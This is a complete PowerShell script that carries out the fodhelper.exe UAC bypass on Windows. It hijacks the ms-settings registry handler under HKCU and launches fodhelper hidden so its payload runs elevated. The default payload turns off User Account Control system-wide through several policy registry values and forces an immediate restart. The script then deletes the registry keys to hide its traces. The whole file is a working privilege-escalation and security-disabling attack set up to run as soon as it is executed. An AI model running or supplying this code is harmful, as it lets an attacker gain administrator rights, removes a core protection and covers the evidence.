function FodhelperBypass {
    Param (
        # The default command will disable UAC
        [String]$program = "powershell -ExecutionPolicy Bypass -Command Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'EnableLUA' -Value 0; Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'ConsentPromptBehaviorAdmin' -Value 0; Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'ConsentPromptBehaviorUser' -Value 0; Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'PromptOnSecureDesktop' -Value 0; shutdown.exe /r /t 0"
    )

    # Create registry structure for UAC bypass
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force | Out-Null

    # Perform the bypass by launching fodhelper.exe (runs elevated)
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

    # Wait a few seconds for fodhelper to launch and execute the commands
    Start-Sleep 3

    # Clean up the registry to remove the UAC bypass traces
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force | Out-Null
}

# Execute the UAC bypass, disable UAC, and restart the system
FodhelperBypass

# Inform the user about what's happening (this part will not show since the execution is hidden)
Write-Host "UAC disabled and system will restart."
